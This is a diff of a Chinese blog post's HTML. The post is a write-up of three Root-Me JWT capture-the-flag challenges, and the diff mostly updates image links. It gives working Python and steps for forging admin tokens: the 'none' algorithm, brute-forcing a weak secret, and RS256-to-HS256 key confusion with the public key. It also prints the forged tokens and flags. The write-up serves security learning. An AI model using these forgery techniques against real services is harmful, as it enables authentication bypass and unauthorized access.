+<h3 id="0x03-JWT-CTF练习"><a href="#0x03-JWT-CTF练习" class="headerlink" title="0x03 JWT CTF练习"></a>0x03 JWT CTF练习</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">练习地址：</span><br><span class="line">https:&#x2F;&#x2F;www.root-me.org&#x2F;?page&#x3D;recherche&amp;lang&#x3D;fr&amp;recherche&#x3D;jwt</span><br></pre></td></tr></table></figure>
 
 <h4 id="JSON-Web-Token-JWT-Introduction"><a href="#JSON-Web-Token-JWT-Introduction" class="headerlink" title="JSON Web Token (JWT) - Introduction"></a>JSON Web Token (JWT) - Introduction</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch58&#x2F;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggvdtp8enyj30xp0esabd.jpg" alt="image-20200718200846778"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gliek0j30xp0esta0.jpg" alt="image-20200718200846778"></p>
 <p>尝试登陆抓包，没有获取到任何有用信息，发现登陆框有个黄色的login as guest，点击抓包放包后返回一串JWT令牌信息</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggx9df6btdj30rm0c7q4z.jpg" alt="image-20200720110552172"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz169jm4pj30rm0c7wh2.jpg" alt="image-20200720110552172"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk</span><br></pre></td></tr></table></figure>
 
 <p>去jwt.io网站解密</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggx9plgyotj30y60jtjth.jpg" alt="image-20200720111733732"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gir5tuj30y60jtjtp.jpg" alt="image-20200720111733732"></p>
 <p>发现有效载荷的用户是guest，所以尝试一波改成admin能行不，但如果修改用户为admin，需要重新生成一下令牌，而现在不知道密钥，可以尝试爆破一波，看看是否能爆破出来。没有爆出来，就有点难受了。。。</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpe5j9vcj30nf0ciq5e.jpg" alt="image-20200720202009464"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz164fwj0j30nf0cimzg.jpg" alt="image-20200720202009464"></p>
 <p>尝试修改签名算法，由于jwt.io不支持none算法，所以使用python生成</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;, algorithm=<span class="literal">None</span>,key=<span class="literal">None</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpkcrasmj30i40310sy.jpg" alt="image-20200720202607012"></p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpnp4es4j30rb0h2tca.jpg" alt="image-20200720202919816"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1625ilpj30i4031glw.jpg" alt="image-20200720202607012"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gi8gchj30rb0h2jva.jpg" alt="image-20200720202919816"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag : S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7</span><br></pre></td></tr></table></figure>
 
 
@@ -212,59 +255,60 @@
 <h4 id="RootMe的JSON-Web-Token-JWT-Weak-secret"><a href="#RootMe的JSON-Web-Token-JWT-Weak-secret" class="headerlink" title="RootMe的JSON Web Token (JWT) - Weak secret"></a>RootMe的JSON Web Token (JWT) - Weak secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch59&#x2F;hello</span><br></pre></td></tr></table></figure>
 
 <p>打开网站后得到一段提示</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxprp99vmj319304raba.jpg" alt="image-20200720203310610"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1654f1nj319304r75b.jpg" alt="image-20200720203310610"></p>
 <p>网翻后。。</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpsti4csj30vg0363z1.jpg" alt="image-20200720203415144"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gne1q0j30vg036dgf.jpg" alt="image-20200720203415144"></p>
 <p>先访问/token</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxptovdl3j311m03uwfj.jpg" alt="image-20200720203505773"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz167hyo3j311m03ut9s.jpg" alt="image-20200720203505773"></p>
 <p>得到令牌</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw</span><br></pre></td></tr></table></figure>
 
 <p>然后使用post方式访问/admin</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpvx0sebj30r508ydh6.jpg" alt="image-20200720203713901"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15yzowbj30r508y40g.jpg" alt="image-20200720203713901"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加Authorization: Bearer YOURTOKEN字段</span><br><span class="line">在请求中添加获取到的令牌</span><br><span class="line"></span><br><span class="line">Authorization: Bearer  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq9b91uqj30r40b7gno.jpg" alt="image-20200720205006225"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15x6njyj30r40b7zms.jpg" alt="image-20200720205006225"></p>
 <p>提示爆破。。。</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpzgu8y1j30lx0cxtav.jpg" alt="image-20200720204038201"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15usqnaj30lx0cxabs.jpg" alt="image-20200720204038201"></p>
 <p>成功 key是lol</p>
 <p>然后去jwt.io生成令牌</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq3jxmx2j30yw0isq55.jpg" alt="image-20200720204434250"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gezqrqj30yw0isjto.jpg" alt="image-20200720204434250"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq7zw0kgj30qy0bfwgg.jpg" alt="image-20200720204850352"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz168e1izj30qy0bfmzg.jpg" alt="image-20200720204850352"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag: PleaseUseAStrongSecretNextTime</span><br></pre></td></tr></table></figure>
 
 
 
 <h4 id="RootMe-JSON-Web-Token-JWT-Public-key"><a href="#RootMe-JSON-Web-Token-JWT-Public-key" class="headerlink" title="RootMe JSON Web Token (JWT) - Public key"></a>RootMe JSON Web Token (JWT) - Public key</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">	http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch60&#x2F;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqgev14ej30op05j74r.jpg" alt="image-20200720205202880"></p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqc9md4tj30d306taae.jpg" alt="image-20200720205256815"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1geg341j30op05j74p.jpg" alt="image-20200720205202880"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15u8gw8j30d306t0t0.jpg" alt="image-20200720205256815"></p>
 <p>首先查看key,貌似很熟悉，就是我们刚刚说过的修改RS256为HS256算法，直接上脚本</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqcn4u45j319l0660uq.jpg" alt="image-20200720205318430"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz163nbvcj319l066767.jpg" alt="image-20200720205318430"></p>
 <p>然后使用post方式访问/auth</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqgftgz2j30rc07zmyp.jpg" alt="image-20200720205628778"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15sd5z9j31dy0u0qa9.jpg" alt="image-20200720205628778"></p>
 <p>提示需要添加username字段</p>
 <p>成功获取token</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqh8dc3lj30ri0a1mzf.jpg" alt="image-20200720205743206"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gmwy73j30ri0a1goe.jpg" alt="image-20200720205743206"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbWUifQ.AWLoeQgDwlTs5q2_32D0rjfKjDJXmUo6r31VVireLpuWaIo3y_xJFHXAGeDhP9l2f1TSDDLO-5o-vIp3Fb9zacQUIw4ZdBcFxSobbHHYxsxuaMhH4kVsgWU1Pg5DRAgufA3c-evuq54byYWWRMgod4P-icMZxkJ1vLxCget5xLIE62qyFBkG4nK6oszmg_wkzK-O5PMUtC_eitO9PAVdR-2JcSSV8tSITEmoBzAK90RGqKQ1sBbm29xtStkZr2TsNo1NT2lrnzaROCO46uQEC7RWbA6kf37oZOF2JOVKQLTnHsobXKPrtKs7MvLwjXkJ1rM3mpvv9ZAE2ePJ7ByBpQ</span><br></pre></td></tr></table></figure>
 
 <p>RS256算法</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqiejyblj30zc0kojvi.jpg" alt="image-20200720205850313"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15wqbmfj30zc0ko42k.jpg" alt="image-20200720205850313"></p>
 <p>脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">        <span class="string">"-----BEGIN PUBLIC KEY-----"</span>,</span><br><span class="line">        <span class="string">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwInLJZXYC/eZ5BbRDrd0"</span>,</span><br><span class="line">        <span class="string">"+IKB7Hc9u/tjZFVGmS6aVW4MSEzkgdJYx5tM9yEc4XGdKy2JJVmZCogya4xvYdC7"</span>,</span><br><span class="line">        <span class="string">"RDqsZLPYlBIoG7KAWjJA6VR4YBcv+2TyamSiYVgXC9p6oe4kvg23lfGB74i8lPZ3"</span>,</span><br><span class="line">        <span class="string">"13Er2Ohj1L1mEBEl1lMDiCHTBCOyCWnsnZJcUWeZcUxCJBimF4RNS5x/H3cs/uVg"</span>,</span><br><span class="line">        <span class="string">"A+f5XM0XW6Fp6WIN/wZmIwBE58LWRM3LRZAY2r+JQ2Zp47tmNkr3Z5Ifk2hLKbjx"</span>,</span><br><span class="line">        <span class="string">"VOjVi86qKnloXfW5Y18M2qFWnwIWvtIJBFN4og8Ms4XVOB9HudyUiblkywZzSq9D"</span>,</span><br><span class="line">        <span class="string">"NwIDAQAB"</span>,</span><br><span class="line">        <span class="string">"-----END PUBLIC KEY-----"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">"\n"</span> . join(key)</span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;,key=key+<span class="string">"\n"</span>,algorithm=<span class="string">"HS256"</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.qZzbNQNfGLSyuvwhb1mKJhBnr3tFHJriIMuxzNEYoG0</span></span><br><span class="line"></span><br><span class="line">PS:如果报错，使用如下命令解决</span><br><span class="line">    卸载pyjwt</span><br><span class="line">    	pip uninstall pyjwt</span><br><span class="line">    安装旧版本pyjwt</span><br><span class="line">    	pip install pyjwt==<span class="number">0.4</span><span class="number">.3</span></span><br></pre></td></tr></table></figure>
 
 <p>访问/admin目录使用post方式添加内容到cookie中</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.qZzbNQNfGLSyuvwhb1mKJhBnr3tFHJriIMuxzNEYoG0</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxr1juwxgj30rt0ciq4w.jpg" alt="image-20200720211714909"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz162zjx3j30rt0ci76v.jpg" alt="image-20200720211714909"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag : HardcodeYourAlgoBro</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h3><p><a href="https://www.jianshu.com/p/c5f2a4e1c98d" target="_blank" rel="noopener">https://www.jianshu.com/p/c5f2a4e1c98d</a></p>
+<h3 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h3><p><a href="https://www.jianshu.com/p/c5f2a4e1c98d" target="_blank" rel="noopener">https://www.jianshu.com/p/c5f2a4e1c98d</a></p>
 <p><a href="http://sircoding.club/blog/post/sirc0de/JWT" target="_blank" rel="noopener">http://sircoding.club/blog/post/sirc0de/JWT</a></p>
 <p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
 <p><a href="https://jwt.io/introduction/" target="_blank" rel="noopener">https://jwt.io/introduction/</a></p>
+<p><a href="https://blog.csdn.net/weixin_44604541/article/details/108921381" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44604541/article/details/108921381</a></p>
 
       
       <!-- reward -->
